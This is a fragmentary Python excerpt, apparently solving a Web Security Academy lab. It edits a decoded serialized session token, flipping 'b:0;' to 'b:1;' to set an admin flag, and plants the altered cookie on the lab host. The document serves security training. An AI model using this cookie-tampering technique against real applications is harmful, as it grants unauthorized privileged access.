...
url = "https://0aab0037032c0e5f81642f9900c20027.web-security-academy.net"
...
changedDecodedSessionToken = normalDecodedSessionToken.replace("b:0;", "b:1;")
...
session.cookies.set(
    "session",
    changedSessionToken,
    domain="0aab0037032c0e5f81642f9900c20027.web-security-academy.net",
)
